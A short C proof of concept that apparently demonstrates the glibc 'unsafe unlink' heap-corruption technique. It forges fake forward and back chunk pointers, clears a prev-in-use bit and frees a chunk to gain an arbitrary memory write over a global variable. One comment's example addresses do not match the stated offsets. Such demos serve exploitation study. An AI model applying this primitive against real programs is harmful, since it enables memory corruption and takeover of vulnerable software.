#include <stdio.h>
#include <stdlib.h>
#define ALLOC_SIZE 0x410
#define FAKE_FD_OFFSET 2
#define FAKE_BK_OFFSET 3
#define PREV_IN_USE_OFFSET -2
#define CHUNK_SIZE_OFFSET -1

long *ptr1;
long *ptr2;
long target = 0;

int main(void){
  fprintf(stderr, "target : 0x%lx\n", target);
  ptr1 = malloc(ALLOC_SIZE);
  ptr2 = malloc(ALLOC_SIZE);

  ptr1[FAKE_FD_OFFSET] = (long)&ptr1 - sizeof(long)*3; // 0x601018
  ptr1[FAKE_BK_OFFSET] = (long)&ptr1 - sizeof(long)*2; // 0x601068
  ptr2[PREV_IN_USE_OFFSET] = ALLOC_SIZE;
  ptr2[CHUNK_SIZE_OFFSET] &= ~1;

  free(ptr2);
  /*
    Unlink is triggered.
    ptr1->FAKE_BK->FD = FAKE_FD
    
    now, ptr1 == (long)&ptr1 - sizeof(long)*3;
  */
  // Arbitrary Write Primitive
  ptr1[3] = (long)&target;
  ptr1[0] = 0xdeadbeefcafebabe;
  fprintf(stderr, "target : 0x%lx\n", target);
}